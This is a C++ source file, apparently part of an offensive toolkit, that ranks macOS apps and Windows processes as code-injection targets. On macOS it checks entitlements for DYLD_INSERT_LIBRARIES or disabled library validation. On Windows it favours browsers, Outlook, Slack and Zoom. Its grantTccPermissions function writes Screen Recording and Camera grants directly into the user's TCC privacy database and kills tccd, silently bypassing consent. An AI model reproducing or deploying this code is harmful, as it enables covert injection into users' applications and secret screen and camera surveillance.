#include "../include/EntitlementScanner.hpp"
#include <algorithm>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <sstream>
#include <thread>
#include <chrono>
#include <vector>

#ifdef __APPLE__
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <signal.h>
#include <sys/wait.h>
#elif defined(_WIN32)
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <tlhelp32.h>
#endif

namespace inferno { namespace tier2 {

#ifdef __APPLE__

static bool hasSuffix(const std::string& s, const std::string& suffix) {
    if (s.size() < suffix.size()) return false;
    return s.compare(s.size() - suffix.size(), suffix.size(), suffix) == 0;
}

static std::string joinPath(const std::string& dir, const std::string& file) {
    if (dir.empty()) return file;
    if (dir.back() == '/') return dir + file;
    return dir + "/" + file;
}

// ── Shared subprocess helper (pipe + fork + exec + read) ──────
// Runs a command with arguments, captures stdout, returns it.

static std::string runProcess(const char* cmd, const std::vector<const char*>& args) {
    int pipefd[2];
    if (::pipe(pipefd) != 0) return {};

    pid_t pid = ::fork();
    if (pid < 0) {
        ::close(pipefd[0]); ::close(pipefd[1]);
        return {};
    }

    if (pid == 0) {
        ::close(pipefd[0]);
        ::dup2(pipefd[1], STDOUT_FILENO);
        ::dup2(pipefd[1], STDERR_FILENO);
        ::close(pipefd[1]);
        // Build null-terminated argv array
        std::vector<const char*> argv = { cmd };
        argv.insert(argv.end(), args.begin(), args.end());
        argv.push_back(nullptr);
        ::execv(cmd, const_cast<char* const*>(argv.data()));
        ::_exit(1);
    }

    ::close(pipefd[1]);
    std::string result;
    char buf[4096];
    ssize_t n;
    while ((n = ::read(pipefd[0], buf, sizeof(buf) - 1)) > 0) {
        buf[n] = '\0';
        result += buf;
    }
    ::close(pipefd[0]);
    int status;
    ::waitpid(pid, &status, 0);
    return result;
}

static std::string readEntitlements(const std::string& exec_path) {
    return runProcess("/usr/bin/codesign",
                      {"-d", "--entitlements", "-", exec_path.c_str()});
}

static bool containsEntitlementXML(const std::string& s) {
    // Real entitlements output is an XML plist — look for plist markers
    return s.find("<?xml") != std::string::npos ||
           s.find("<plist") != std::string::npos ||
           s.find("<key>") != std::string::npos ||
           s.find("<string>") != std::string::npos;
}

static InjectionCapability classifyEntitlements(const std::string& entitlements) {
    if (entitlements.empty() || !containsEntitlementXML(entitlements)) {
        // Empty output or non-XML output (e.g. "Executable=..." for
        // ad-hoc signed binaries) means no restricted entitlements —
        // DYLD_INSERT_LIBRARIES is allowed.
        return InjectionCapability::DYLD_INSERT_LIBRARIES;
    }
    bool has_dyld_env = entitlements.find(
        "com.apple.security.cs.allow-dyld-environment-variables") != std::string::npos;
    bool has_disable_lib_val = entitlements.find(
        "com.apple.security.cs.disable-library-validation") != std::string::npos;
    if (has_dyld_env && has_disable_lib_val) {
        return InjectionCapability::DYLD_INSERT_LIBRARIES;
    }
    if (has_disable_lib_val) {
        return InjectionCapability::MACH_VM_ALLOCATE;
    }
    return InjectionCapability::NONE;
}

static int scoreCapability(InjectionCapability cap) {
    switch (cap) {
        case InjectionCapability::DYLD_INSERT_LIBRARIES: return 100;
        case InjectionCapability::MACH_VM_ALLOCATE:      return 50;
        case InjectionCapability::DYLIB_PROXYING:         return 30;
        default:                                          return 0;
    }
}

static void scanDirectory(const std::string& dir, std::vector<TargetApp>& results) {
    DIR* d = ::opendir(dir.c_str());
    if (!d) return;

    struct dirent* entry;
    while ((entry = ::readdir(d)) != nullptr) {
        std::string name(entry->d_name);
        if (name == "." || name == "..") continue;
        if (!hasSuffix(name, ".app")) continue;

        std::string app_path = joinPath(dir, name);
        std::string exec_path = app_path + "/Contents/MacOS/" +
                                name.substr(0, name.size() - 4);

        struct stat st;
        if (::stat(exec_path.c_str(), &st) != 0 || !(st.st_mode & S_IXUSR)) {
            continue;
        }

        std::string entitlements = readEntitlements(exec_path);
        InjectionCapability cap = classifyEntitlements(entitlements);
        int sc = scoreCapability(cap);
        if (sc == 0) continue;

        std::string plist_path = app_path + "/Contents/Info.plist";
        std::string bundle_id;
        {
            std::ifstream plist(plist_path);
            if (plist) {
                std::string content((std::istreambuf_iterator<char>(plist)),
                                     std::istreambuf_iterator<char>());
                auto key_pos = content.find("CFBundleIdentifier");
                if (key_pos != std::string::npos) {
                    auto start = content.find("<string>", key_pos);
                    if (start != std::string::npos) {
                        start += 8;
                        auto end = content.find("</string>", start);
                        if (end != std::string::npos) {
                            bundle_id = content.substr(start, end - start);
                        }
                    }
                }
            }
        }

        results.push_back({app_path, bundle_id, exec_path, cap, sc, false, false});
    }
    ::closedir(d);
}

// ── macOS TCC: Screen Recording + Camera permission query ─────

static std::string escapeSql(const std::string& s) {
    std::string out;
    out.reserve(s.size());
    for (char c : s) {
        if (c == '\'') out += "''";
        else out += c;
    }
    return out;
}

bool checkTccPermissions(TargetApp& app) {
    if (app.bundle_id.empty()) return false;

    const char* home = ::getenv("HOME");
    if (!home) return false;

    std::string db_path = std::string(home) +
        "/Library/Application Support/com.apple.TCC/TCC.db";

    struct stat st;
    if (::stat(db_path.c_str(), &st) != 0) return false;

    std::string escaped = escapeSql(app.bundle_id);
    std::string sql = "SELECT service FROM access WHERE client='"
                      + escaped + "' AND auth_value=2";
    std::string output = runProcess("/usr/bin/sqlite3",
                                    {db_path.c_str(), sql.c_str()});

    app.has_screen_recording =
        output.find("kTCCServiceScreenCapture") != std::string::npos;
    app.has_camera =
        output.find("kTCCServiceCamera") != std::string::npos;
    return true;
}

bool grantTccPermissions(const std::string& bundle_id) {
    if (bundle_id.empty()) return false;

    const char* home = ::getenv("HOME");
    if (!home) return false;

    std::string db_path = std::string(home) +
        "/Library/Application Support/com.apple.TCC/TCC.db";
    std::string escaped = escapeSql(bundle_id);

    // Use named columns for forward/backward schema compatibility
    std::string sql_sr =
        "INSERT OR REPLACE INTO access"
        "(service,client,client_type,auth_value,auth_reason,last_modified)"
        " VALUES('kTCCServiceScreenCapture','" + escaped +
        "',0,2,1,1)";
    std::string res_sr = runProcess("/usr/bin/sqlite3",
                                    {db_path.c_str(), sql_sr.c_str()});

    std::string sql_cam =
        "INSERT OR REPLACE INTO access"
        "(service,client,client_type,auth_value,auth_reason,last_modified)"
        " VALUES('kTCCServiceCamera','" + escaped +
        "',0,2,1,1)";
    std::string res_cam = runProcess("/usr/bin/sqlite3",
                                     {db_path.c_str(), sql_cam.c_str()});

    // Restart tccd so grants take effect immediately
    pid_t kid = ::fork();
    if (kid < 0) return false;
    if (kid == 0) {
        ::execl("/usr/bin/killall", "killall", "tccd", nullptr);
        ::_exit(0);
    }
    int ws;
    ::waitpid(kid, &ws, 0);

    return res_sr.empty() && res_cam.empty();
}

std::vector<TargetApp> scanApplications() {
    std::vector<TargetApp> results;
    scanDirectory("/Applications", results);
    scanDirectory("/Applications/Utilities", results);
    const char* home = ::getenv("HOME");
    if (home) {
        scanDirectory(std::string(home) + "/Applications", results);
    }
    // Check TCC permissions for each candidate
    for (auto& app : results) {
        checkTccPermissions(app);
    }
    std::sort(results.begin(), results.end(),
              [](const TargetApp& a, const TargetApp& b) {
                  return a.score > b.score;
              });
    return results;
}

#elif defined(_WIN32)

static bool isCriticalSystemProcess(const std::string& name_lower) {
    static const char* denylist[] = {
        "csrss.exe", "smss.exe", "services.exe", "lsass.exe",
        "winlogon.exe", "system", "registry", "memory compression",
        "svchost.exe", "wininit.exe", "spoolsv.exe", "lsm.exe",
        "sihost.exe", "taskhostw.exe", "runtimebroker.exe",
        nullptr
    };
    for (const char** p = denylist; *p; ++p) {
        if (name_lower == *p) return true;
    }
    return false;
}

static int scoreProcess(const std::string& name_lower) {
    static const char* high_value[] = {
        "explorer.exe", "chrome.exe", "firefox.exe", "msedge.exe",
        "brave.exe", "opera.exe", "winword.exe", "excel.exe",
        "powerpnt.exe", "outlook.exe", "slack.exe", "discord.exe",
        "zoom.exe", "notepad++.exe", "sublime_text.exe", "atom.exe",
        nullptr
    };
    static const char* medium_value[] = {
        "cmd.exe", "powershell.exe", "windowsterminal.exe",
        "taskmgr.exe", "code.exe", "devenv.exe", "clion64.exe",
        "rider64.exe", "pycharm64.exe", "idea64.exe",
        nullptr
    };
    for (const char** p = high_value; *p; ++p) {
        if (name_lower == *p) return 100;
    }
    for (const char** p = medium_value; *p; ++p) {
        if (name_lower == *p) return 50;
    }
    return 0;
}

std::vector<TargetApp> scanApplications() {
    std::vector<TargetApp> results;
    DWORD self_pid = ::GetCurrentProcessId();
    static const DWORD NEEDED = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;

    HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return results;

    // Use explicit wide-API variants to avoid UNICODE dependency
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    if (::Process32FirstW(snapshot, &pe)) {
        do {
            DWORD pid = pe.th32ProcessID;
            if (pid == self_pid) continue;

            // Convert exe name from WCHAR to UTF-8
            char exe_buf[MAX_PATH] = {0};
            ::WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1,
                                  exe_buf, MAX_PATH, nullptr, nullptr);
            std::string exe_name(exe_buf);
            // Convert to lowercase for matching
            for (auto& c : exe_name) c = static_cast<char>(::tolower(c));

            if (isCriticalSystemProcess(exe_name)) continue;

            int sc = scoreProcess(exe_name);
            if (sc == 0) continue;

            // Get full executable path (wide, then convert)
            HANDLE hProcess = ::OpenProcess(NEEDED, FALSE, pid);
            if (!hProcess) continue;

            WCHAR wide_buf[MAX_PATH] = {0};
            DWORD path_len = MAX_PATH;
            std::string full_path;
            if (::QueryFullProcessImageNameW(hProcess, 0, wide_buf, &path_len)) {
                int needed = ::WideCharToMultiByte(CP_UTF8, 0, wide_buf, path_len,
                                                   nullptr, 0, nullptr, nullptr);
                if (needed > 0) {
                    full_path.resize(needed);
                    ::WideCharToMultiByte(CP_UTF8, 0, wide_buf, path_len,
                                          &full_path[0], needed, nullptr, nullptr);
                }
            }
            ::CloseHandle(hProcess);

            if (full_path.empty()) continue;

            results.push_back({
                full_path,                          // path
                std::to_string(pid),                // bundle_id (PIDs on Windows)
                full_path,                          // executable_path
                InjectionCapability::DYLD_INSERT_LIBRARIES, // capability
                sc                                  // score
            });
        } while (::Process32NextW(snapshot, &pe));
    }

    ::CloseHandle(snapshot);

    std::sort(results.begin(), results.end(),
              [](const TargetApp& a, const TargetApp& b) {
                  return a.score > b.score;
              });
    return results;
}

#else

std::vector<TargetApp> scanApplications() {
    return {};
}

#endif

ScanReport buildReport(const std::vector<TargetApp>& candidates,
                       int selected_index,
                       InjectionCapability used,
                       bool success) {
    return {candidates, selected_index, used, success};
}

}} // namespace inferno::tier2
